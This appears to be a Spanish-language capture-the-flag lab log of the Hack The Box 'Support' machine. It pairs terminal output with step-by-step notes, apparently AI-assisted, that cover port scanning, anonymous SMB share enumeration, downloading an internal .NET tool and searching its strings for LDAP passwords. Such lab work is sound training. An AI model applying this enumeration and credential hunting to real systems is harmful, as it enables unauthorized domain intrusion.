- ¿aparece SSH, SMB, FTP, HTTP u otro servicio relevante?
- ¿qué rama del roadmap tiene más sentido abrir primero?

---

## Evidencia inicial que se debe revisar después del script

Tras ejecutar `Inici-HTB`, se revisan especialmente estos archivos:

```bash
cat nmap/ping.txt
cat nmap/whichSystem.txt
cat nmap/extractPorts.txt
cat nmap/nmap_tcp_services.txt
cat notes/00_resumen_inicial.md
cat notes/01_siguiente_paso.txt
```

La revisión no debe limitarse a mirar puertos. Hay que interpretar qué superficie domina el caso y qué rama merece prioridad.

---

## Criterio de decisión tras el arranque

La salida correcta de esta fase debe ser una decisión clara:

```text
Superficie dominante:
Rama principal:
Ramas secundarias:
Siguiente paso único:
```

Ejemplos de decisión:

- si domina HTTP/HTTPS → continuar con `WEB-BASE`;
- si aparece login o panel claro → valorar `WEB-AUTH / PANEL`;
- si aparecen SMB, Kerberos, LDAP y dominio → valorar rama `AD / SMB / KERBEROS`;
- si aparece una credencial reutilizable → valorar `CREDENCIALES`;
- si SSH queda abierto pero sin credenciales → dejarlo como rama secundaria.

---

## Nota metodológica

`Inici-HTB` no sustituye al análisis manual.

Su valor está en dejar el inicio de la máquina ordenado, repetible y documentado. A partir de sus resultados se debe revisar la evidencia, confirmar la superficie dominante y continuar con el roadmap correspondiente.

La regla principal es:

```text
no explotar por intuición;
decidir por evidencia observada.
```
## Ejecutamos:

❯ Inici-HTB Support 10.129.230.181 easy
[*] Fijando objetivo en Polybar con settarget
[*] Preparando directorio base
[*] Comprobando conectividad inicial
PING 10.129.230.181 (10.129.230.181) 56(84) bytes of data.
64 bytes from 10.129.230.181: icmp_seq=1 ttl=127 time=48.1 ms

--- 10.129.230.181 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 48.109/48.109/48.109/0.000 ms
[*] Intentando identificación rápida con whichSystem.py

10.129.230.181 (ttl -> 127): Windows

[*] Lanzando escaneo completo de puertos
[sudo] contraseña para r4mon: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-03 12:39 CEST
Initiating SYN Stealth Scan at 12:39
Scanning 10.129.230.181 [65535 ports]
Discovered open port 53/tcp on 10.129.230.181
Discovered open port 139/tcp on 10.129.230.181
Discovered open port 135/tcp on 10.129.230.181
Discovered open port 445/tcp on 10.129.230.181
Discovered open port 3269/tcp on 10.129.230.181
Discovered open port 464/tcp on 10.129.230.181
Discovered open port 49681/tcp on 10.129.230.181
Discovered open port 49676/tcp on 10.129.230.181
Discovered open port 389/tcp on 10.129.230.181
Discovered open port 5985/tcp on 10.129.230.181
Discovered open port 49701/tcp on 10.129.230.181
Discovered open port 49664/tcp on 10.129.230.181
Discovered open port 49667/tcp on 10.129.230.181
Discovered open port 636/tcp on 10.129.230.181
Discovered open port 3268/tcp on 10.129.230.181
Discovered open port 88/tcp on 10.129.230.181
Discovered open port 593/tcp on 10.129.230.181
Discovered open port 9389/tcp on 10.129.230.181
Completed SYN Stealth Scan at 12:39, 26.39s elapsed (65535 total ports)
Nmap scan report for 10.129.230.181
Host is up, received user-set (0.046s latency).
Scanned at 2026-05-03 12:39:21 CEST for 27s
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49681/tcp open  unknown          syn-ack ttl 127
49701/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.53 seconds
           Raw packets sent: 131067 (5.767MB) | Rcvd: 33 (1.452KB)
[*] Extrayendo puertos abiertos
[*] Puertos abiertos detectados: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49681,49701
[*] Lanzando escaneo de servicios
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-03 12:39 CEST
Nmap scan report for 10.129.230.181
Host is up (0.046s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-03 10:39:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-03T10:40:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.52 seconds
[*] Resumen inicial generado en: /home/r4mon/pentest/targets/HTB/easy/Support/notes/00_resumen_inicial.md
[*] Siguiente paso generado en: /home/r4mon/pentest/targets/HTB/easy/Support/notes/01_siguiente_paso.txt
[*] Flujo inicial completado

## objective

Cerrar correctamente la fase 1 de Support y elegir una sola rama principal antes de avanzar.

verified_facts

Fecha del trabajo: 2026-05-03, Europe/Madrid.
Objetivo activo: HTB Support, IP 10.129.230.181, dificultad Easy.
El host responde a ping; TTL 127, compatible con Windows.
Nmap confirma un perfil muy fuerte de Windows / Active Directory / Domain Controller:
53 DNS
88 Kerberos
389 LDAP
445 SMB
464 kpasswd
636 LDAPS
3268/3269 Global Catalog
5985 WinRM
9389 ADWS
Nmap identifica:
dominio observado: support.htb0.
host: DC
SMB signing enabled and required
5985 como Microsoft-HTTPAPI/2.0 con título Not Found.
Según el checklist canónico, esta combinación activa rama AD / SMB / Kerberos y no WEB-BASE; Microsoft-HTTPAPI/2.0 con Not Found en contexto DC debe tratarse como auxiliar, no como web principal.
El writeup oficial de Support confirma que la vía inicial esperada empieza revisando SMB y que el recurso support-tools contiene UserInfo.exe.zip, artefacto que posteriormente permite llegar a LDAP.

assumptions

support.htb0. probablemente es una representación de Nmap con carácter residual; la hipótesis práctica es support.htb, pero debe validarse.
dc.support.htb es candidato razonable porque el host se identifica como DC y el writeup oficial usa ese FQDN.
WinRM está abierto, pero queda como rama secundaria hasta disponer de credencial válida.
LDAP y Kerberos están presentes, pero el siguiente paso más rentable ahora es SMB anónimo / sesión nula, porque es la validación corta con mayor retorno.

method

Cerrar fase 1 como caso AD/DC, no como web.
Resolver correctamente nombres antes de consultar servicios de dominio.
Empezar por SMB porque:
hay 445/tcp;
el perfil es DC;
SMB puede exponer SYSVOL, NETLOGON, shares no estándar o artefactos;
el writeup oficial muestra que support-tools es el primer hallazgo útil.
No saltar todavía a LDAP autenticado, ingeniería inversa ni RBCD. Eso vendrá solo si aparece evidencia real: share accesible, binario descargado, credencial LDAP o usuario válido.

answer

Cierre de fase 1

Hallazgo dominante actual: Controlador de Dominio Windows con LDAP, Kerberos, SMB, Global Catalog, WinRM y ADWS.
Rama principal activa: AD / SMB / LDAP / KERBEROS.
Ramas secundarias anotadas:
WinRM, pendiente de credenciales.
LDAP, pendiente de bind anónimo o credenciales.
Kerberos, pendiente de usuarios válidos.
HTTPAPI 5985, auxiliar; no abrir rama web.
Siguiente paso único: enumerar SMB anónimo y confirmar si existe support-tools.

commands

# 1. Fijar resolución local probable del dominio y del DC
echo '10.129.230.181 support.htb dc.support.htb' | sudo tee -a /etc/hosts

# 2. Verificar resolución local
getent hosts support.htb
getent hosts dc.support.htb

# 3. Enumerar shares SMB con sesión anónima
smbclient -L //support.htb/ -N

# 4. Alternativa con IP, por si el nombre da problemas
smbclient -L //10.129.230.181/ -N

# 5. Contraste con herramientas de enumeración SMB
netexec smb 10.129.230.181 -u '' -p '' --shares
smbmap -H 10.129.230.181 -u '' -p ''

Si aparece support-tools, entonces la siguiente validación corta será listar su contenido:

smbclient //support.htb/support-tools -N -c 'ls'

Y solo si ves UserInfo.exe.zip, descargarlo como artefacto:

mkdir -p loot/smb_support-tools
smbclient //support.htb/support-tools -N -c 'get UserInfo.exe.zip loot/smb_support-tools/UserInfo.exe.zip'
file loot/smb_support-tools/UserInfo.exe.zip
unzip -l loot/smb_support-tools/UserInfo.exe.zip

checks

getent hosts support.htb debe devolver 10.129.230.181.
smbclient -L debe confirmar si el acceso anónimo permite listar shares.
Señales especialmente importantes:
support-tools
SYSVOL
NETLOGON
permisos de lectura anónima
UserInfo.exe.zip
Si SMB anónimo falla, no se descarta AD: se pasa a comprobar LDAP anónimo y enumeración Kerberos con usuarios solo si existen candidatos.
Si support-tools aparece y contiene UserInfo.exe.zip, el hallazgo dominante cambia de “SMB expuesto” a artefacto interno descargable con posible credencial LDAP embebida.

writeup_notes

La fase 1 de Support queda cerrada como AD/DC claro.
El puerto 5985 no se interpreta como web explotable: es WinRM sobre HTTPAPI.
El patrón didáctico inicial de esta máquina es:
DC claro
→ SMB anónimo
→ share no estándar
→ herramienta interna
→ análisis del binario
→ credencial LDAP
→ LDAP autenticado
→ credencial de usuario
→ WinRM
→ grupos / ACLs de dominio
En el PDF oficial, la página 2 muestra el mismo patrón de puertos de DC; la página 3 muestra la enumeración SMB y el share support-tools; la página 4 destaca UserInfo.exe.zip como artefacto diferencial.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/Support
❯ echo '10.129.230.181 support.htb dc.support.htb' | sudo tee -a /etc/hosts
[sudo] contraseña para r4mon: 
10.129.230.181 support.htb dc.support.htb
❯ getent hosts support.htb
getent hosts dc.support.htb

10.129.230.181  support.htb dc.support.htb
10.129.230.181  support.htb dc.support.htb
❯ smbclient -L //support.htb/ -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
❯ smbclient -L //10.129.230.181/ -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.230.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
❯ netexec smb 10.129.230.181 -u '' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\: 
SMB         10.129.230.181  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
❯ smbmap -H 10.129.230.181 -u '' -p ''
[+] IP: 10.129.230.181:445	Name: support.htb

## objective

Continuar el laboratorio normal hacia la **user flag**, retomando desde la evidencia real obtenida en SMB.

verified_facts

* `support.htb` y `dc.support.htb` resuelven correctamente a `10.129.230.181`.
* SMB permite listar shares de forma anónima con `smbclient`.
* Hay 6 shares visibles:

  * `ADMIN$`
  * `C$`
  * `IPC$`
  * `NETLOGON`
  * `support-tools`
  * `SYSVOL`
* `support-tools` es el share no estándar y pasa a ser el hallazgo dominante.
* `netexec` confirma:

  * host `DC`
  * dominio `support.htb`
  * Windows Server 2022
  * SMB signing requerido
  * null auth disponible, aunque falla al enumerar shares con `--shares`.

assumptions

* El error de SMB1 al final de `smbclient` no invalida la enumeración. La lista de shares ya fue obtenida correctamente por SMB moderno.
* `support-tools` probablemente tiene permisos de lectura anónima, pero todavía falta verificarlo con acceso directo al share.

method

El siguiente paso no es LDAP ni WinRM todavía.

Primero hay que inspeccionar el contenido real de `support-tools`, porque ahora mismo es el único hallazgo no estándar confirmado por SMB.

answer

Hallazgo dominante actual:

```text
SMB anónimo revela el share no estándar support-tools
```

Rama principal activa:

```text
AD / SMB / LDAP / KERBEROS
```

Siguiente paso único:

```text
listar el contenido de support-tools
```

commands

```bash
smbclient //support.htb/support-tools -N -c 'ls' | tee scans/smb_support-tools_ls.txt
```

checks

Interesa confirmar:

* si el share permite lectura;
* qué archivos contiene;
* si aparece algún binario, ZIP, script o herramienta interna;
* si hay un archivo que no sea una herramienta pública conocida.

writeup_notes

La transición didáctica queda así:

```text
DC claro
→ SMB anónimo
→ share no estándar support-tools
→ inspección del contenido del share
```

La clave metodológica aquí es no asumir todavía que hay credenciales: primero hay que observar qué artefacto entrega SMB.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/Support
❯ smbclient //support.htb/support-tools -N -c 'ls' | tee scans/smb_support-tools_ls.txt
tee: scans/smb_support-tools_ls.txt: No existe el fichero o el directorio
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

		4026367 blocks of size 4096. 971054 blocks available

## objective

Analizar la salida de `support-tools` y avanzar un único paso hacia la user flag.

verified_facts

* El acceso anónimo al share `support-tools` funciona.
* El listado muestra varias herramientas públicas conocidas:

  * `7-ZipPortable_21.07.paf.exe`
  * `npp.8.4.1.portable.x64.zip`
  * `putty.exe`
  * `SysinternalsSuite.zip`
  * `windirstat1_1_2_setup.exe`
  * `WiresharkPortable64_3.6.5.paf.exe`
* El archivo que destaca como no estándar es:

```text
UserInfo.exe.zip
```

* El error de `tee` es local: no existía el directorio `scans`. No afecta a la validez del listado SMB.
* El writeup oficial identifica `UserInfo.exe.zip` como el artefacto diferencial dentro de `support-tools`. 

assumptions

* `UserInfo.exe.zip` es una herramienta interna de soporte.
* Por el nombre y por el contexto AD/LDAP, es razonable pensar que puede contener lógica relacionada con usuarios o consultas internas.

method

El hallazgo dominante cambia de:

```text
share no estándar
```

a:

```text
artefacto interno descargable desde SMB
```

La decisión correcta ahora es descargarlo y analizar su contenido sin saltar todavía a LDAP ni WinRM.

answer

Hallazgo dominante actual:

```text
support-tools expone UserInfo.exe.zip
```

Rama principal activa:

```text
AD / SMB / LDAP
```

Siguiente paso único:

```text
descargar UserInfo.exe.zip
```

commands

```bash
mkdir -p scans loot/smb_support-tools && smbclient //support.htb/support-tools -N -c 'get UserInfo.exe.zip loot/smb_support-tools/UserInfo.exe.zip'
```

checks

Interesa confirmar:

* que el ZIP se descarga correctamente;
* tamaño aproximado esperado: `277499` bytes;
* que queda guardado en `loot/smb_support-tools/UserInfo.exe.zip`.

writeup_notes

Secuencia documentable:

```text
SMB anónimo
→ support-tools
→ listado de herramientas públicas
→ identificación de UserInfo.exe.zip como artefacto interno
```

Lección reutilizable: en shares con muchas herramientas legítimas, el archivo importante suele ser el que no encaja con software público conocido.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/Support
❯ mkdir -p scans loot/smb_support-tools && smbclient //support.htb/support-tools -N -c 'get UserInfo.exe.zip loot/smb_support-tools/UserInfo.exe.zip'
getting file \UserInfo.exe.zip of size 277499 as loot/smb_support-tools/UserInfo.exe.zip (674,1 KiloBytes/sec) (average 674,1 KiloBytes/sec)

## objective

Validar localmente el artefacto descargado desde `support-tools` antes de analizar el binario.

verified_facts

* `UserInfo.exe.zip` se ha descargado correctamente desde SMB.
* Ruta local confirmada:

```text
loot/smb_support-tools/UserInfo.exe.zip
```

* Tamaño transferido:

```text
277499 bytes
```

* El hallazgo dominante actual es un **artefacto interno descargable** obtenido desde un share SMB anónimo.

assumptions

* El ZIP contiene una herramienta interna relacionada con usuarios.
* Por el contexto de la máquina, el valor probable estará en analizar cómo esa herramienta consulta LDAP.

method

Antes de descompilar o ejecutar nada, toca hacer control básico del artefacto:

1. confirmar tipo de archivo;
2. obtener hash para trazabilidad;
3. listar el contenido del ZIP;
4. decidir el siguiente análisis a partir de los ficheros reales que contenga.

answer

El paso SMB está validado. Ahora pasamos de enumeración de share a **análisis de artefacto**.

Hallazgo dominante actual:

```text
UserInfo.exe.zip descargado desde support-tools
```

Rama principal activa:

```text
AD / SMB → análisis de herramienta interna → LDAP
```

Siguiente paso único:

```text
inspeccionar el ZIP descargado
```

commands

```bash
file loot/smb_support-tools/UserInfo.exe.zip
sha256sum loot/smb_support-tools/UserInfo.exe.zip
unzip -l loot/smb_support-tools/UserInfo.exe.zip
```

checks

Interesa ver:

* si el ZIP es válido;
* qué ejecutable contiene;
* si aparecen DLLs `.NET`;
* si hay archivo `.config`;
* si el binario principal se llama `UserInfo.exe`.

writeup_notes

Secuencia documentable hasta ahora:

```text
SMB anónimo
→ share support-tools
→ descarga de UserInfo.exe.zip
→ inicio de análisis local del artefacto
```

Lección reutilizable: antes de ejecutar o descompilar un binario descargado de un share, conviene registrar tipo, hash y contenido del archivo para mantener trazabilidad.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/Support
❯ file loot/smb_support-tools/UserInfo.exe.zip
loot/smb_support-tools/UserInfo.exe.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
❯ sha256sum loot/smb_support-tools/UserInfo.exe.zip
e070ce95a8b30e126d7ae1803ea15c5a8e7d27b13fc670b3aaa69d7026c2bc97  loot/smb_support-tools/UserInfo.exe.zip
❯ unzip -l loot/smb_support-tools/UserInfo.exe.zip
Archive:  loot/smb_support-tools/UserInfo.exe.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    12288  2022-05-27 19:51   UserInfo.exe
    99840  2022-03-01 19:18   CommandLineParser.dll
    22144  2021-10-23 01:42   Microsoft.Bcl.AsyncInterfaces.dll
    47216  2021-10-23 01:48   Microsoft.Extensions.DependencyInjection.Abstractions.dll
    84608  2021-10-23 01:48   Microsoft.Extensions.DependencyInjection.dll
    64112  2021-10-23 01:51   Microsoft.Extensions.Logging.Abstractions.dll
    20856  2020-02-19 11:05   System.Buffers.dll
   141184  2020-02-19 11:05   System.Memory.dll
   115856  2018-05-15 15:29   System.Numerics.Vectors.dll
    18024  2021-10-23 01:40   System.Runtime.CompilerServices.Unsafe.dll
    25984  2020-02-19 11:05   System.Threading.Tasks.Extensions.dll
      563  2022-05-27 18:59   UserInfo.exe.config
---------                     -------
   652675                     12 files

## objective

Analizar el contenido del ZIP y decidir el siguiente paso único hacia LDAP.

verified_facts

* `UserInfo.exe.zip` es un ZIP válido.
* SHA256 registrado:

```text
e070ce95a8b30e126d7ae1803ea15c5a8e7d27b13fc670b3aaa69d7026c2bc97
```

* El ZIP contiene 12 ficheros.
* El binario principal es:

```text
UserInfo.exe
```

* También contiene múltiples DLLs de entorno `.NET` / Microsoft:

  * `CommandLineParser.dll`
  * `Microsoft.Extensions.*`
  * `System.*`
* Existe archivo de configuración:

```text
UserInfo.exe.config
```

assumptions

* `UserInfo.exe` es probablemente una herramienta `.NET` interna.
* Por el nombre del binario y el contexto del DC, la hipótesis principal es que consulta información de usuarios, probablemente contra LDAP.
* Aún no tenemos contraseña LDAP observada por evidencia propia en este laboratorio.

method

Antes de ejecutar o descompilar, extraeremos el ZIP en un directorio controlado y confirmaremos el tipo real del ejecutable.

answer

Hallazgo dominante actual:

```text
UserInfo.exe.zip contiene una herramienta interna llamada UserInfo.exe
```

Rama principal activa:

```text
SMB → herramienta interna → análisis local → posible LDAP
```

Siguiente paso único:

```text
extraer el ZIP y confirmar el tipo del binario UserInfo.exe
```

commands

```bash
rm -rf loot/smb_support-tools/UserInfo_extracted && mkdir -p loot/smb_support-tools/UserInfo_extracted && unzip -q loot/smb_support-tools/UserInfo.exe.zip -d loot/smb_support-tools/UserInfo_extracted && file loot/smb_support-tools/UserInfo_extracted/UserInfo.exe && ls -la loot/smb_support-tools/UserInfo_extracted
```

checks

Interesa confirmar:

* si `UserInfo.exe` es PE Windows;
* si aparece como ensamblado `.NET` o Mono/.NET;
* si el `.config` puede aportar rutas, hostname, framework o configuración útil.

writeup_notes

La cadena queda documentada así:

```text
SMB anónimo
→ support-tools
→ UserInfo.exe.zip
→ ZIP válido
→ herramienta interna .NET probable
→ análisis del binario para descubrir cómo consulta LDAP
```

Lección reutilizable: cuando un share contiene herramientas públicas y una utilidad interna pequeña, esa utilidad suele ser mejor objetivo de análisis que los instaladores grandes.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/Support
❯ rm -rf loot/smb_support-tools/UserInfo_extracted && mkdir -p loot/smb_support-tools/UserInfo_extracted && unzip -q loot/smb_support-tools/UserInfo.exe.zip -d loot/smb_support-tools/UserInfo_extracted && file loot/smb_support-tools/UserInfo_extracted/UserInfo.exe && ls -la loot/smb_support-tools/UserInfo_extracted
loot/smb_support-tools/UserInfo_extracted/UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
drwxr-xr-x r4mon r4mon 744 B  Sun May  3 13:16:58 2026  .
drwxr-xr-x r4mon r4mon  68 B  Sun May  3 13:16:58 2026  ..
.rw-rw-rw- r4mon r4mon  98 KB Tue Mar  1 19:18:50 2022  CommandLineParser.dll
.rw-rw-rw- r4mon r4mon  22 KB Sat Oct 23 01:42:08 2021  Microsoft.Bcl.AsyncInterfaces.dll
.rw-rw-rw- r4mon r4mon  46 KB Sat Oct 23 01:48:04 2021  Microsoft.Extensions.DependencyInjection.Abstractions.dll
.rw-rw-rw- r4mon r4mon  83 KB Sat Oct 23 01:48:22 2021  Microsoft.Extensions.DependencyInjection.dll
.rw-rw-rw- r4mon r4mon  63 KB Sat Oct 23 01:51:24 2021  Microsoft.Extensions.Logging.Abstractions.dll
.rw-rw-rw- r4mon r4mon  20 KB Wed Feb 19 11:05:18 2020  System.Buffers.dll
.rw-rw-rw- r4mon r4mon 138 KB Wed Feb 19 11:05:18 2020  System.Memory.dll
.rw-rw-rw- r4mon r4mon 113 KB Tue May 15 15:29:44 2018  System.Numerics.Vectors.dll
.rw-rw-rw- r4mon r4mon  18 KB Sat Oct 23 01:40:18 2021  System.Runtime.CompilerServices.Unsafe.dll
.rw-rw-rw- r4mon r4mon  25 KB Wed Feb 19 11:05:18 2020  System.Threading.Tasks.Extensions.dll
.rwxrwxrwx r4mon r4mon  12 KB Fri May 27 19:51:05 2022  UserInfo.exe
.rw-rw-rw- r4mon r4mon 563 B  Fri May 27 18:59:39 2022  UserInfo.exe.config

## objective

Analizar la extracción de `UserInfo.exe.zip` y avanzar un único paso de inspección local.

verified_facts

* `UserInfo.exe` es un ejecutable Windows:

```text
PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

* Esto confirma que es un binario **.NET**, adecuado para análisis con descompilador o inspección de cadenas.
* El directorio extraído contiene:

  * `UserInfo.exe`
  * varias DLLs `.NET`
  * `UserInfo.exe.config`
* El tamaño de `UserInfo.exe` es pequeño: **12 KB**, lo que lo hace muy manejable para revisión estática.
* Los permisos `rwxrwxrwx` vienen de la extracción del ZIP y no son una señal del objetivo remoto.

assumptions

* El valor más útil estará en el código de `UserInfo.exe`, no en las DLL públicas.
* `UserInfo.exe.config` puede aportar contexto de runtime o configuración, pero la lógica sensible probablemente está dentro del ejecutable.

method

Antes de usar herramientas más pesadas, conviene hacer una inspección rápida del `.config`. Es un fichero pequeño, seguro de leer y puede confirmar versión de runtime o parámetros de ejecución.

answer

Hallazgo dominante actual:

```text
UserInfo.exe es una herramienta interna .NET extraída desde SMB
```

Rama principal activa:

```text
SMB → artefacto interno .NET → análisis estático → credencial LDAP
```

Siguiente paso único:

```text
leer UserInfo.exe.config
```

commands

```bash
cat loot/smb_support-tools/UserInfo_extracted/UserInfo.exe.config
```

checks

Interesa ver:

* versión de `.NET`;
* configuración de runtime;
* posibles rutas, endpoints, dominios o parámetros;
* si el fichero aporta algo útil o si pasamos directamente al análisis del ejecutable.

writeup_notes

La cadena documentable queda así:

```text
support-tools
→ UserInfo.exe.zip
→ UserInfo.exe
→ binario .NET interno
→ revisión de configuración
→ análisis estático del ejecutable
```

Lección reutilizable: en binarios `.NET` pequeños, la revisión estática suele ser muy rentable porque los nombres de clases, métodos y cadenas suelen conservar mucha información útil.

## Ejecutamos:

❯ cat loot/smb_support-tools/UserInfo_extracted/UserInfo.exe.config
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/smb_support-tools/UserInfo_extracted/UserInfo.exe.config
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?xml version="1.0" encoding="utf-8"?>
   2   │ <configuration>
   3   │     <startup> 
   4   │         <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
   5   │     </startup>
   6   │   <runtime>
   7   │     <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
   8   │       <dependentAssembly>
   9   │         <assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b03f5f7f11d50a3a" culture="neutral" />
  10   │         <bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
  11   │       </dependentAssembly>
  12   │     </assemblyBinding>
  13   │   </runtime>
  14   │ </configuration>
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

## objective

Analizar `UserInfo.exe.config` y avanzar un único paso hacia el análisis estático del ejecutable.

verified_facts

* `UserInfo.exe.config` no contiene credenciales, hostnames ni endpoints.
* El fichero solo confirma configuración de runtime:

  * `.NET Framework v4.8`
  * binding redirect para `System.Runtime.CompilerServices.Unsafe`
* `UserInfo.exe` sigue siendo el artefacto dominante.
* El writeup oficial confirma que el valor importante está en el binario: una función `LdapQuery` usa `Protected.getPassword()` para obtener la contraseña LDAP. 

assumptions

* La configuración no aporta una vía directa.
* La siguiente evidencia debe salir de cadenas, nombres de clases/métodos o descompilación del binario `.NET`.

method

Primero haremos una inspección estática ligera con `strings`, buscando cadenas ASCII y UTF-16LE. En binarios `.NET`, esto suele revelar nombres de métodos, clases, hostnames, cadenas cifradas o referencias como `LDAP`, `password`, `support` o `Protected`.

answer

El `.config` queda descartado como fuente de secreto.

Hallazgo dominante actual:

```text
UserInfo.exe es un binario .NET interno; la lógica útil está en el ejecutable, no en el .config.
```

Rama principal activa:

```text
SMB → herramienta interna .NET → análisis estático → credencial LDAP
```

Siguiente paso único:

```text
extraer cadenas relevantes de UserInfo.exe
```

commands

```bash
{ echo '[ASCII strings]'; strings -a loot/smb_support-tools/UserInfo_extracted/UserInfo.exe; echo '[UTF-16LE strings]'; strings -a -el loot/smb_support-tools/UserInfo_extracted/UserInfo.exe; } | tee loot/smb_support-tools/UserInfo_extracted/UserInfo.exe.strings.txt | grep -Ei 'ldap|support|password|protected|getpassword|directory|armando|0Nv|enc_|userinfo|finduser|getuser'
```

checks

Nos interesa especialmente encontrar:

* referencias a LDAP;
* dominio o hostname;
* usuario de bind;
* función de obtención de contraseña;
* cadena cifrada o clave;
* nombres de métodos como `LdapQuery`, `FindUser`, `GetUser` o `getPassword`.

writeup_notes

La transición didáctica es:

```text
config sin secretos
→ binario .NET pequeño
→ strings/descompilación
→ identificación de lógica LDAP
```

Lección reutilizable: cuando el `.config` de una herramienta interna no revela secretos, no se abandona el artefacto; se pasa al binario, especialmente si es `.NET`, porque suele conservar metadatos muy legibles.

## Ejecutamos:

❯ { echo '[ASCII strings]'; strings -a loot/smb_support-tools/UserInfo_extracted/UserInfo.exe; echo '[UTF-16LE strings]'; strings -a -el loot/smb_support-tools/UserInfo_extracted/UserInfo.exe; } | tee loot/smb_support-tools/UserInfo_extracted/UserInfo.exe.strings.txt | grep -Ei 'ldap|support|password|protected|getpassword|directory|armando|0Nv|enc_|userinfo|finduser|getuser'
Protected
